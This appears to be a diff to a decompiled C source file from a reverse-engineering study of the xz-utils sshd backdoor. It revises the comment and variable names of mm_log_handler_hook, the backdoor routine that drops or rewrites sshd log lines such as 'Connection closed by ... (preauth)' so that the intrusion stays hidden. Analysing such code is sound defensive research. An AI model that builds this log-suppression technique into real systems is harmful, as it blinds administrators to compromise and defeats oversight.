@@ -5,7 +5,10 @@
 
 
 /*
- * AutoDoc: Intercepts monitor log messages, filtering or rewriting lines that match attacker-selected strings before optionally forwarding them to the original handler. Command flags processed in `run_backdoor_commands` enable this to suppress giveaway log entries while the payload operates.
+ * AutoDoc: Interposes on sshd's log handler, ignoring every message when logging is globally disabled or
+ * selectively rewriting the 'Connection closed by ... (preauth)' lines when filtering mode is
+ * enabled. It rebuilds safe format strings on the stack, calls sshd_log() to emit the sanitised
+ * message, and leaves syslog alone unless the caller requested suppression via cmd flags.
  */
 #include "xzre_types.h"
 
@@ -15,7 +18,7 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
 {
   char *pcVar1;
   int iVar2;
-  sshd_log_ctx_t *log_ctx;
+  sshd_log_ctx_t *log_ctx_00;
   long lVar3;
   EncodedStringId EVar4;
   ssize_t sVar5;
@@ -30,6 +33,9 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
   ulong uVar14;
   ulong uVar15;
   byte bVar16;
+  char rewritten_msg [320];
+  sshd_log_ctx_t *log_ctx;
+  log_handler_fn sshlog_impl;
   undefined8 local_438;
   undefined8 uStack_430;
   undefined4 local_428 [60];
@@ -53,7 +59,7 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
   undefined1 local_201;
   
   bVar16 = 0;
-  log_ctx = *(sshd_log_ctx_t **)(global_ctx + 0x30);
+  log_ctx_00 = *(sshd_log_ctx_t **)(global_ctx + 0x30);
   lVar3 = *(long *)(global_ctx + 0x10);
   local_438 = 0;
   uStack_430 = 0;
@@ -77,14 +83,14 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
     puVar10 = puVar10 + 1;
   }
   if (msg != (char *)0x0) {
-    if (log_ctx->logging_disabled == 1) {
+    if (log_ctx_00->logging_disabled == 1) {
       return;
     }
     if (*(int *)(global_ctx + 0x90) != 0) {
       return;
     }
-    if ((log_ctx->orig_log_handler != (log_handler_fn)0x0) &&
-       (log_ctx->orig_log_handler_ctx == (void *)0x0)) {
+    if ((log_ctx_00->orig_log_handler != (log_handler_fn)0x0) &&
+       (log_ctx_00->orig_log_handler_ctx == (void *)0x0)) {
       return;
     }
     sVar5 = c_strlen(msg);
@@ -107,14 +113,14 @@ void mm_log_handler_hook(LogLevel level,int forced,char *msg,void *ctx)
       }
       msg = msg + 1;
     }
-    local_238 = CONCAT62(local_238._2_6_,*(undefined2 *)log_ctx->STR_percent_s);
-    log_ctx->logging_disabled = 1;
-    if (((log_ctx->syslog_disabled != 0) && (lVar3 != 0)) &&
+    local_238 = CONCAT62(local_238._2_6_,*(undefined2 *)log_ctx_00->STR_percent_s);
+    log_ctx_00->logging_disabled = 1;
+    if (((log_ctx_00->syslog_disabled != 0) && (lVar3 != 0)) &&
        (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
       (**(code **)(lVar3 + 0x58))(0xff);
     }
-    sshd_log(log_ctx,level,(char *)&local_238,msg);
-    iVar2 = log_ctx->syslog_disabled;
+    sshd_log(log_ctx_00,level,(char *)&local_238,msg);
+    iVar2 = log_ctx_00->syslog_disabled;
     goto joined_r0x0010a4c2;
   }
   goto LAB_0010a6da;
@@ -150,47 +156,47 @@ LAB_0010a504:
     msg = msg + 1;
   } while (msg < pcVar1);
   if ((uVar15 != 0) && (uVar14 != 0)) {
-    pcVar1 = log_ctx->STR_Connection_closed_by;
+    pcVar1 = log_ctx_00->STR_Connection_closed_by;
     lVar7 = 0;
     do {
       lVar6 = lVar7 + 1;
       *(char *)((long)&local_238 + lVar7) = pcVar1[lVar7];
       lVar7 = lVar6;
     } while (lVar6 != 0x15);
-    pcVar1 = log_ctx->STR_authenticating;
+    pcVar1 = log_ctx_00->STR_authenticating;
     lVar7 = 0;
     do {
       local_223[lVar7] = pcVar1[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 0xe);
     local_215 = 0x20;
-    pcVar1 = log_ctx->STR_user;
+    pcVar1 = log_ctx_00->STR_user;
     lVar7 = 0;
     do {
       local_214[lVar7] = pcVar1[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 4);
     local_210 = 0x20;
-    local_20f = *log_ctx->STR_percent_s;
-    local_20e = log_ctx->STR_percent_s[1];
+    local_20f = *log_ctx_00->STR_percent_s;
+    local_20e = log_ctx_00->STR_percent_s[1];
     local_20d = 0x20;
-    local_20c = *log_ctx->STR_percent_s;
-    local_20b = log_ctx->STR_percent_s[1];
+    local_20c = *log_ctx_00->STR_percent_s;
+    local_20b = log_ctx_00->STR_percent_s[1];
     local_20a = 0x5b20;
-    pcVar1 = log_ctx->STR_preauth;
+    pcVar1 = log_ctx_00->STR_preauth;
     lVar7 = 0;
     do {
       local_208[lVar7] = pcVar1[lVar7];
       lVar7 = lVar7 + 1;
     } while (lVar7 != 7);
     local_201 = 0x5d;
-    log_ctx->logging_disabled = 1;
-    if (((log_ctx->syslog_disabled != 0) && (lVar3 != 0)) &&
+    log_ctx_00->logging_disabled = 1;
+    if (((log_ctx_00->syslog_disabled != 0) && (lVar3 != 0)) &&
        (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
       (**(code **)(lVar3 + 0x58))(0xff);
     }
-    sshd_log(log_ctx,SYSLOG_LEVEL_INFO,(char *)&local_238,&local_338,&local_438);
-    iVar2 = log_ctx->syslog_disabled;
+    sshd_log(log_ctx_00,SYSLOG_LEVEL_INFO,(char *)&local_238,&local_338,&local_438);
+    iVar2 = log_ctx_00->syslog_disabled;
 joined_r0x0010a4c2:
     if (iVar2 == 0) {
       return;
@@ -205,7 +211,7 @@ joined_r0x0010a4c2:
     return;
   }
 LAB_0010a6da:
-  log_ctx->logging_disabled = 1;
+  log_ctx_00->logging_disabled = 1;
   return;
 }
 
